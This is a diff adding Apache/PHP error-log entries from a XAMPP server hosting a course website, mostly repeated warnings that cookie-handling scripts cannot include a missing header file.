+[Mon Feb 07 20:30:01.630982 2022] [php7:notice] [pid 2356:tid 1496] [client 50.92.115.45:64514] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:07.141794 2022] [php7:notice] [pid 2356:tid 1484] [client 50.92.239.221:55502] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:07.141794 2022] [php7:notice] [pid 2356:tid 1484] [client 50.92.239.221:55502] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:07.141794 2022] [php7:notice] [pid 2356:tid 1484] [client 50.92.239.221:55502] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:07.141794 2022] [php7:notice] [pid 2356:tid 1484] [client 50.92.239.221:55502] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:07.141794 2022] [php7:notice] [pid 2356:tid 1484] [client 50.92.239.221:55502] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:07.141794 2022] [php7:notice] [pid 2356:tid 1484] [client 50.92.239.221:55502] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:37.809480 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.101.183:52377] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:37.809480 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.101.183:52377] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:37.809480 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.101.183:52377] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:37.809480 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.101.183:52377] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:37.809480 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.101.183:52377] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:37.809480 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.101.183:52377] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:30:49.181512 2022] [php7:notice] [pid 2356:tid 1484] [client 207.216.101.183:52376] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:49.181512 2022] [php7:notice] [pid 2356:tid 1484] [client 207.216.101.183:52376] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:49.181512 2022] [php7:notice] [pid 2356:tid 1484] [client 207.216.101.183:52376] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:49.181512 2022] [php7:notice] [pid 2356:tid 1484] [client 207.216.101.183:52376] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:49.181512 2022] [php7:notice] [pid 2356:tid 1484] [client 207.216.101.183:52376] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:30:49.181512 2022] [php7:notice] [pid 2356:tid 1484] [client 207.216.101.183:52376] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:31:15.342743 2022] [php7:notice] [pid 2356:tid 1496] [client 174.7.156.224:61896] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:31:15.342743 2022] [php7:notice] [pid 2356:tid 1496] [client 174.7.156.224:61896] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:31:15.342743 2022] [php7:notice] [pid 2356:tid 1496] [client 174.7.156.224:61896] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:31:15.342743 2022] [php7:notice] [pid 2356:tid 1496] [client 174.7.156.224:61896] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:31:15.342743 2022] [php7:notice] [pid 2356:tid 1496] [client 174.7.156.224:61896] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:31:15.342743 2022] [php7:notice] [pid 2356:tid 1496] [client 174.7.156.224:61896] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:32:31.075920 2022] [php7:notice] [pid 2356:tid 1444] [client 174.7.156.224:61900] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:32:31.075920 2022] [php7:notice] [pid 2356:tid 1444] [client 174.7.156.224:61900] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:32:31.075920 2022] [php7:notice] [pid 2356:tid 1444] [client 174.7.156.224:61900] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:32:31.075920 2022] [php7:notice] [pid 2356:tid 1444] [client 174.7.156.224:61900] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:32:31.075920 2022] [php7:notice] [pid 2356:tid 1444] [client 174.7.156.224:61900] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:32:31.075920 2022] [php7:notice] [pid 2356:tid 1444] [client 174.7.156.224:61900] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:33:40.565265 2022] [php7:notice] [pid 2356:tid 1488] [client 174.7.156.224:61903] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:33:40.565265 2022] [php7:notice] [pid 2356:tid 1488] [client 174.7.156.224:61903] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:33:40.565265 2022] [php7:notice] [pid 2356:tid 1488] [client 174.7.156.224:61903] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:33:40.565265 2022] [php7:notice] [pid 2356:tid 1488] [client 174.7.156.224:61903] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:33:40.565265 2022] [php7:notice] [pid 2356:tid 1488] [client 174.7.156.224:61903] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:33:40.565265 2022] [php7:notice] [pid 2356:tid 1488] [client 174.7.156.224:61903] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:02.213343 2022] [php7:notice] [pid 2356:tid 1532] [client 207.216.101.183:52520] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:02.213343 2022] [php7:notice] [pid 2356:tid 1532] [client 207.216.101.183:52520] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:02.213343 2022] [php7:notice] [pid 2356:tid 1532] [client 207.216.101.183:52520] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:02.213343 2022] [php7:notice] [pid 2356:tid 1532] [client 207.216.101.183:52520] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:02.213343 2022] [php7:notice] [pid 2356:tid 1532] [client 207.216.101.183:52520] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:02.213343 2022] [php7:notice] [pid 2356:tid 1532] [client 207.216.101.183:52520] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:09.962253 2022] [php7:notice] [pid 2356:tid 1468] [client 207.216.101.183:52537] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:09.962253 2022] [php7:notice] [pid 2356:tid 1468] [client 207.216.101.183:52537] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:09.962253 2022] [php7:notice] [pid 2356:tid 1468] [client 207.216.101.183:52537] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:09.962253 2022] [php7:notice] [pid 2356:tid 1468] [client 207.216.101.183:52537] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:09.962253 2022] [php7:notice] [pid 2356:tid 1468] [client 207.216.101.183:52537] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:09.962253 2022] [php7:notice] [pid 2356:tid 1468] [client 207.216.101.183:52537] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+A subdirectory or file c:\tommy already exists.
+[Mon Feb 07 20:35:22.250799 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.175.109:50102] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:22.250799 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.175.109:50102] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:22.250799 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.175.109:50102] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:22.250799 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.175.109:50102] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:22.250799 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.175.109:50102] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:22.250799 2022] [php7:notice] [pid 2356:tid 1440] [client 207.216.175.109:50102] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:35:25.390772 2022] [php7:notice] [pid 2356:tid 1456] [client 24.80.136.2:57578] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:25.390772 2022] [php7:notice] [pid 2356:tid 1456] [client 24.80.136.2:57578] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:25.390772 2022] [php7:notice] [pid 2356:tid 1456] [client 24.80.136.2:57578] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:25.390772 2022] [php7:notice] [pid 2356:tid 1456] [client 24.80.136.2:57578] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:25.390772 2022] [php7:notice] [pid 2356:tid 1456] [client 24.80.136.2:57578] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:35:25.390772 2022] [php7:notice] [pid 2356:tid 1456] [client 24.80.136.2:57578] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:36:05.449096 2022] [php7:notice] [pid 2356:tid 1512] [client 207.216.175.109:50120] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:36:05.449096 2022] [php7:notice] [pid 2356:tid 1512] [client 207.216.175.109:50120] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:36:05.449096 2022] [php7:notice] [pid 2356:tid 1512] [client 207.216.175.109:50120] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:36:05.449096 2022] [php7:notice] [pid 2356:tid 1512] [client 207.216.175.109:50120] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:36:05.449096 2022] [php7:notice] [pid 2356:tid 1512] [client 207.216.175.109:50120] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:36:05.449096 2022] [php7:notice] [pid 2356:tid 1512] [client 207.216.175.109:50120] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:06.954604 2022] [php7:notice] [pid 2356:tid 1444] [client 64.180.108.159:64793] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:39:06.954604 2022] [php7:notice] [pid 2356:tid 1444] [client 64.180.108.159:64793] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:39:06.954604 2022] [php7:notice] [pid 2356:tid 1444] [client 64.180.108.159:64793] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:39:06.954604 2022] [php7:notice] [pid 2356:tid 1444] [client 64.180.108.159:64793] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:39:06.954604 2022] [php7:notice] [pid 2356:tid 1444] [client 64.180.108.159:64793] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:39:06.954604 2022] [php7:notice] [pid 2356:tid 1444] [client 64.180.108.159:64793] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Notice:  Undefined index: webDelete in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Warning:  Invalid argument supplied for foreach() in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Warning:  Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:9) in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 18, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:23.671628 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   2. header() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:18, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:29.076086 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:29.076086 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:29.076086 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:29.076086 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:29.076086 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:29.076086 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:64794] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:41.373497 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:62453] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:41.373497 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:62453] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:41.373497 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:62453] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:41.373497 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:62453] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:41.373497 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:62453] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:39:41.373497 2022] [php7:notice] [pid 2356:tid 1440] [client 64.180.108.159:62453] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:41:04.408113 2022] [php7:notice] [pid 2356:tid 1464] [client 207.216.101.183:52617] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:41:04.408113 2022] [php7:notice] [pid 2356:tid 1464] [client 207.216.101.183:52617] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:41:04.408113 2022] [php7:notice] [pid 2356:tid 1464] [client 207.216.101.183:52617] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:41:04.408113 2022] [php7:notice] [pid 2356:tid 1464] [client 207.216.101.183:52617] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:41:04.408113 2022] [php7:notice] [pid 2356:tid 1464] [client 207.216.101.183:52617] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:41:04.408113 2022] [php7:notice] [pid 2356:tid 1464] [client 207.216.101.183:52617] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:42:09.407047 2022] [php7:notice] [pid 2356:tid 1460] [client 207.216.101.183:52633] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:42:09.407047 2022] [php7:notice] [pid 2356:tid 1460] [client 207.216.101.183:52633] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:42:09.407047 2022] [php7:notice] [pid 2356:tid 1460] [client 207.216.101.183:52633] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:42:09.407047 2022] [php7:notice] [pid 2356:tid 1460] [client 207.216.101.183:52633] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:42:09.407047 2022] [php7:notice] [pid 2356:tid 1460] [client 207.216.101.183:52633] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:42:09.407047 2022] [php7:notice] [pid 2356:tid 1460] [client 207.216.101.183:52633] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:49:38.383305 2022] [php7:notice] [pid 2356:tid 1516] [client 172.218.232.87:51469] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:49:38.383305 2022] [php7:notice] [pid 2356:tid 1516] [client 172.218.232.87:51469] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:49:38.383305 2022] [php7:notice] [pid 2356:tid 1516] [client 172.218.232.87:51469] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:49:38.383305 2022] [php7:notice] [pid 2356:tid 1516] [client 172.218.232.87:51469] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:49:38.383305 2022] [php7:notice] [pid 2356:tid 1516] [client 172.218.232.87:51469] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:49:38.383305 2022] [php7:notice] [pid 2356:tid 1516] [client 172.218.232.87:51469] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:50:11.361315 2022] [php7:notice] [pid 2356:tid 1460] [client 75.154.233.190:55416] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
